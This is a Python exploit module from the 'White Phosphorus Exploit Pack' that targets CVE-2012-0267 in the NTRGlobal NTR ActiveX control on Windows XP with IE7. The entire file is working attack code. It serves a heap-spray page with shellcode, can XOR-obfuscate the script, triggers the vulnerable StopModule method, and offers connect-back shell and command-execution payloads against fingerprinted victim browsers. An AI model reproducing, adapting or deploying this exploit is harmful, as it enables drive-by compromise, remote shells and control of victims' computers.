
#! /usr/bin/env python
######################################################################################
# White Phosphorus Exploit Pack
#
# Proprietary source code - use only under the license agreement in distribution
#
######################################################################################


import sys 
sys.path.append(".")
sys.path.append("3rdparty/White_Phosphorus/libs")

import os
import socket
import sys
import time
from struct import *

from wp_exploit import *
from wp_dialog import *
from wp_osversions import *
from exploitutils import *
from tcpexploit import *
from httpclientside import httpclientside
from libs.jsobfuscate.jsobfuscate import JSObfuscator


NAME = "NTRGlobal NTR ActiveX 1.1.8 StopModule Remote Code Execution"
DESCRIPTION = "Exploits a clientside remote code execution vulnerability in the NTR ActiveX Control"
VERSION = "1.0"
DOCUMENTATION = {}
DOCUMENTATION['VENDOR']='NTRGlobal'
DOCUMENTATION["Date public"] = "2012-01-11"
DOCUMENTATION["Repeatability"] = "One Shot"
DOCUMENTATION['CVE Name']="CVE-2012-0267"
DOCUMENTATION['CVE Url'] = 'http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-0267'
DOCUMENTATION['CVSS'] = '0.0'
DOCUMENTATION["References"] = "http://secunia.com/secunia_research/2012-2"
DOCUMENTATION["Notes"] = """
This is a browser based client-side exploit - it must be used via httpserver.
Vulnerability limits shellcode options & target browsers to <= IE7
"""

PROPERTY = {}
PROPERTY['TYPE'] = "Exploit"
PROPERTY['SITE'] = "Clientside"
PROPERTY['ARCH'] = [ ["Windows"] ]
PROPERTY['VERSION'] = [ "XP" ]
PROPERTY['DELIVERY'] = 'HTTP'

NOTES="""
This is a browser based client-side exploit - it must be used via httpserver.
Vulnerability limits shellcode options & target browsers to <= IE7

----------------------------------------------------------------
WP> White Phosphorus Exploit Pack
WP> NTRGlobal NTR ActiveX 1.1.8 StopModule Remote Code Execution
----------------------------------------------------------------
Usage:
-T (check if target is vulnerable)
-v <version to target>
-t <target ip>   -p <target port>
-l <callback ip> -d <callback port>
-F <filename>

Payload Options:
-O payload:<#>   (will use default if not specified)
-O command:<cmd> (for Execute Command payload)
-O bind:<port>   (for Bind MOSDEF Shell)

Versions:
0: Windows XP IE7 Universal

Payloads:
0: IE Inject Connect Back
1: Execute Command

Example:
./commandlineInterface.py -p 5555 -v 17
./3rdparty/White_Phosphorus/exploits/wp_ntrglobal_ntractivex_stopmodule/wp_ntrglobal_ntractivex_stopmodule.py -v 0 -t 10.1.1.10 -l 10.1.1.1 -d 5555 -O payload:0
"""

PORT = 0

def dialog_update(gtk, wt):
    wp_dialog_update(gtk, wt, theexploit, targets, PORT)
    return

targets = {
    0 : ["Windows Windows XP+Vista IE7 Universal", (0x00000000), [WINALL]]
}

class theexploit(wp_exploit, httpclientside):
    PAYLOADS=["IE Inject Connect Back",
              "Execute Command"]
    
    DEFAULT_PAYLOAD = 0

    def __init__(self):
        wp_exploit.__init__(self)
        httpclientside.__init__(self)
        self.setInfo(DESCRIPTION)
        self.setInfo(VERSION)
        self.name = NAME
        self.targets = targets
        self.version = 0
        self.isClientD = False
        self.use_universal = True
        self.encode_printable = True        
        self.alignstack = True
        self.badstring = "\x00\x09\x0a\x0b\x0c\x0d\x22\x5c"
        self.filename= "".join( [ random.choice(string.uppercase) for x in range(8) ] ) + ".html"          
        self.filename2= "".join( [ random.choice(string.uppercase) for x in range(8) ] ) + ".html"
        self.jsObfuscator = JSObfuscator()
        self.jsObfuscator.xorKeyFromCookie("SessionID")
        return

    def is_vulnerable(self, info_dict):
        """
        Check for IE
        """
        self.isClientD = True
        if "MSIE" in info_dict['user_agent']:
            self.log("WP> Target has MSIE")
            language = info_dict['plugins'].get("language", "")
            if type(language)==type([]):
                language=language[0]
            self.log("WP> language found: %s"%language)
            if "en-us" in language:
                return 95
            else:
                return 20
        return 0

    def usage(self):
        self.wp_usage(targets,"-F <filename>")
        return  

    def neededListenerTypes(self):
        self.getArgs()
        return self.wp_createWin32Listener()

    def createShellcode(self):
        self.getArgs()

        self.log('WP> Targeting version %d: %s'%(self.version,targets[self.version][0]))
        return self.wp_createShellcode()

    def getArgs(self):
        if getattr(self,'useSSLMOSDEF', False):
            self.isClientD = True
            self.DEFAULT_PAYLOAD = 1
        else:      
            if self.HTTPMOSDEF:
                if self.useSSLMOSDEF:
                    self.DEFAULT_PAYLOAD = 1
                else:
                    self.DEFAULT_PAYLOAD = 2
            
        self.wp_getShellcodeType()
        
        if self.target:    
            self.host=self.target.interface
            
        self.filename=self.argsDict.get('filename',self.filename)
        return

    def displayVersions(self):
        for t in targets.keys():
            print 'WP> Version %d: %s'%(t,targets[t][0])
        return
    
    def makefile(self,browser,osversion):
        if osversion == "Windows XP":
            if browser == "MSIE 7.0":
                self.log('WP> Serving Windows XP IE7 exploit')
                return self.makefileIE7_XP()
	    
	self.log('WP> Invalid target')
        return
        
    def makefileIE7_XP(self):
	payload = "\x8B\xE0" # MOV ESP,EAX
	payload += "\x83\xC4\x05" # ADD ESP,05
	payload += self.shellcode
        payload += wp_randomstring((5120-len(payload)))

        filedata="""<html>
<head>
<script>"""
        
        script = wp_clientside_HeapLib(padding="%u0c0c")
                
        #script code
        script += """
var heap_obj = new heapLib.ie(0x20000);

var nops = unescape("NOPS");
var code = unescape("SHELLCODE");

while (nops.length < 0x2000) nops += nops;
var offset = nops.substring(0, 0x5F4);
var shellcode = offset + code + nops.substring(0, 0x1000-code.length-offset.length);

while (shellcode.length < 0x80000) shellcode += shellcode;
var block = shellcode.substring(0,  (0x80000-6)/2);

heap_obj.gc();
for (var z=1; z < 0x300; z++) {
	heap_obj.alloc(block);
}
"""
        script = script.replace('SHELLCODE',wp_urluencode(payload))
        script = script.replace('NOPS',wp_urluencode(pack('<L',0x0c0c0c0c)))

        #Obfuscate the script code (disabled for this exploit)
        self.isClientD=False
        if self.isClientD:
            self.log("WP> Running jsObfuscator")
            filedata += self.jsObfuscator.obfuscate(script)
        else:
            filedata += script
	
	filedata += self.maketrigger()
	return filedata
    
    def maketrigger(self):
	filedata = """</script>
<body>
<object classid='clsid:E6ACF817-0A85-4EBE-9F0A-096C6488CFEA' id='target'></object>
<script>
target.StopModule(%s);
</script>
</body>
</html>
"""%((0x0c0c0c0c/0x134))
	return filedata

    def makesploit(self,clientheader,clientbody):
        self.createShellcode()
        
        # The main call from ClientD
        from libs.spkproxy import header,body
        
        h=header('SERVER')
        b=body()
        
        self.log('WP> ****************************************')
        self.log("WP> URL Received: %s"%clientheader.URL)
        user_agent  = clientheader.getStrValue(['User-Agent'])
        cookies = clientheader.getStrValue(['Cookie'])
        
        # Get details
        browser,osversion = wp_browserinfo(user_agent)
        self.log('WP> OSVersion: %s' % osversion)
        self.log('WP> Browser: %s' % browser)
        self.log('WP> ')      
        
        if clientheader.URL.count(self.filename):

            data=self.makefile(browser,osversion)
            if not data:
                return None,None
            b.setBody(data)
            h.addHeader('Content-Type','text/html')
            h.addHeader('Set-Cookie','SessionID=%d' % self.jsObfuscator.getXORKey())
        else:
            self.log('WP> Redirecting to self')
            h.status='302'
            h.addHeader('Location',self.filename)
            h.addHeader('Content-Type','text/html')
        return h,b

    def run(self):
	self.log('WP> This module must be run via HTTPSERVER')
	return 0

if __name__== '__main__':
    print 'WP> Running White Phosphorus %s Exploit v %s'%(NAME,VERSION)
    app = theexploit()
    ret=standard_callback_commandline(app)
    if ret not in [0,1,None]:
        ret.interact()



